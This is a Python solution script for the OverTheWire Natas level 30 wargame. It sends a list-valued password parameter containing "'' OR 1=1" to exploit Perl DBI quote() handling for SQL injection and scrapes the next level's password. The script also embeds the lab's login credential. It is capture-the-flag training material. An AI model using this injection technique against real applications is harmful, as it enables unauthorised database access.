import requests
import re

username = "natas30"
password = "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()
# response = session.post(url, auth=(username,password))

payload = {"username": "natas31", "password": ["'' OR 1=1", 4]}

response = session.post(
    url,
    auth=(username, password),
    data=payload
)
#print(response.text)
print (re.findall("here is your result:<br>natas31(.*)<div",response.text)[0])

# Vulnerability: In Perl CGI, passing an array reference (e.g., [value, type]) to DBI->quote()
# causes it to bypass string quoting or mishandle type casting, allowing raw SQL injection.
